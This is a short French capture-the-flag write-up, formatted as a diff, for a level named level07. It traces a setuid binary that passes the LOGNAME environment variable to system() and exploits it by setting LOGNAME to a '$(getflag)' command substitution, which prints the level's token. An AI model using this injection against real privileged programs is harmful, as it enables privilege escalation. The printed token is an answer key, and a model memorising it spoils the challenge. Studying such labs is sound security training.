@@ -1,0 +1,28 @@
+Nous sommes ici en presence d'un binaire level07
+En lancant le binaire, nous avons comme retour le nom du binaire : level07
+
+Analysons ce binaire grace a ltrace ./level07 nous avons : 
+
+__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                                                                                                                    = 2007
+geteuid()                                                                                                                                                    = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                                                          = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                                                          = 0
+getenv("LOGNAME")                                                                                                                                            = "level07"
+asprintf(0xbffff704, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280)                                                                                          = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                                                       = 0
++++ exited (status 0) +++
+
+Nous voyons plus haut un appel a la fonction getenv() qui retourne une variable d'environnement. La faille devrait se situer ici et non pas dans le asprintf en nous remarquons en utilisons la commande env que la variable d'environnement LOGNAME est set a la valeur level07. Changeons donc cette variable d'environnement LOGNAME :
+
+export LOGNAME=toto
+./level07 -> toto
+
+La valeur de retour a ete modifiee et prend la valeur de LOGNAME. Essayant en attribuant la valeur getflag a LOGNAME : 
+
+export LOGNAME=\$\(getflag\)
+./level07 -> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
